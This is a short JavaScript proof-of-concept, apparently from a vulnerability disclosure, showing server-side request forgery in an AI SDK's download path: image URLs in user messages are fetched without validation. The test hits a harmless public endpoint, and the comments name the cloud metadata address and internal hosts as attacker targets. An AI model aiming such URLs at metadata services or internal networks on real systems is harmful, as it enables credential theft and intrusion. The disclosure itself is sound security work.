/**
 * PoC: SSRF via user-controlled URLs in AI SDK download
 *
 * The default download in packages/ai/src/util/download/download.ts
 * fetches any URL with no validation. Flow:
 *   User message (image/file URL) -> downloadAssets() -> fetch(url)
 *
 * Attacker URLs: 169.254.169.254 (cloud metadata), internal hosts.
 *
 * Run from repo root after `pnpm build`:
 *   node vulnerabilities/ssrf-download-user-urls/poc.js
 */

const path = require('path');
const TARGET = 'http://httpbin.org/get';

async function main() {
  const fetched = [];
  const orig = global.fetch;
  global.fetch = (url) => {
    fetched.push(typeof url === 'string' ? url : url?.href);
    return orig(url);
  };

  try {
    const ai = require(path.join(__dirname, '../../packages/ai/dist/index.cjs'));
    if (ai.createDefaultDownloadFunction && ai.download) {
      const dl = ai.createDefaultDownloadFunction(ai.download);
      await dl([{ url: new URL(TARGET), isUrlSupportedByModel: false }]);
    } else {
      const { generateText } = ai;
      const openai = require('@ai-sdk/openai').createOpenAI({ apiKey: 'sk-x' });
      await generateText({
        model: openai('gpt-4o'),
        messages: [{
          role: 'user',
          content: [
            { type: 'text', text: 'Hi' },
            { type: 'image', image: TARGET, mimeType: 'image/png' },
          ],
        }],
        maxRetries: 0,
      }).catch(() => {});
    }
  } catch (e) {
    console.log('Build required: pnpm build');
    console.log('Vulnerability: packages/ai downloads user URLs without validation.');
    return;
  }

  global.fetch = orig;
  const hit = fetched.find(u => u && u.includes('httpbin'));
  console.log(hit ? '>>> SSRF: Fetched ' + hit : 'Fetched:', fetched.slice(0, 3));
}

main().catch(console.error);
